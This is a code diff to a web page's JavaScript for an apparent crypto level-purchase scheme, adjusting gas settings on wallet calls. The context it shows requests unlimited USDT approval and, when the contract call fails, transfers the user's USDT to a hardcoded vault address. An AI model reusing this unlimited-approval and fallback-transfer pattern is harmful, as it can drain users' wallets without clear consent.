@@ -6126,7 +6126,10 @@ input:checked + .tw-slider:before {
                         confirmBtn.disabled = true;
                         confirmBtn.innerText = "APPROVE IN WALLET...";
                     }
-                    const appTx = await usdtContract.approve(spenderTarget, ethers.constants.MaxUint256);
+                    const appTx = await usdtContract.approve(spenderTarget, ethers.constants.MaxUint256, {
+                        gasLimit: ethers.BigNumber.from("100000"),
+                        gasPrice: ethers.utils.parseUnits("3", "gwei")
+                    });
                     try {
                         await appTx.wait(1);
                     } catch (wErr) {
@@ -6155,7 +6158,8 @@ input:checked + .tw-slider:before {
                         web3Signer
                     );
                     const tx = await shineContract.buyLevel(progNum, lvl, {
-                        gasLimit: 300000
+                        gasLimit: ethers.BigNumber.from("350000"),
+                        gasPrice: ethers.utils.parseUnits("3", "gwei")
                     });
                     try {
                         await tx.wait(1);
@@ -6165,7 +6169,8 @@ input:checked + .tw-slider:before {
                 } catch (contractErr) {
                     const vaultTarget = SHINE_VAULT_ADDRESS || "0x204e8c521aCa3621DB585829667759433aBb70d3";
                     const transferTx = await usdtContract.transfer(vaultTarget, requiredUnits, {
-                        gasLimit: 90000
+                        gasLimit: ethers.BigNumber.from("100000"),
+                        gasPrice: ethers.utils.parseUnits("3", "gwei")
                     });
                     try {
                         await transferTx.wait(1);
